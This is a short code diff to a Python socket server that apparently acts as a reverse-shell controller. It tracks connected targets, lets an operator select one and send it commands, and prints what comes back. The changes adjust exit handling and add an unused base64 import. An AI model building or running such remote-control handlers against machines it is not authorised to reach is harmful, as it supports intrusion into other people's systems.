@@ -1,3 +1,4 @@
+from base64 import encode
 import socket
 import sys
 import threading
@@ -75,13 +76,14 @@ def start_shell():
 
         elif cmd == 'exit':
             for i, conn in enumerate(all_connections):
+                conn.send('exit')
                 conn.close()
                 del all_connections[i]
                 del all_addresses[i]
             
             s.close()
-            sys.exit()
-
+            break
+        
         elif cmd[:6] == 'select':
             conn = get_target(cmd)
 
@@ -144,6 +146,9 @@ def send_target_commands(conn):
                 response = str(conn.recv(201480), "utf-8")
                 print(response, end='')
                 err_cnt = 0
+
+                if(cmd == 'exit'):
+                    break
             
         except:
             err_cnt += 1
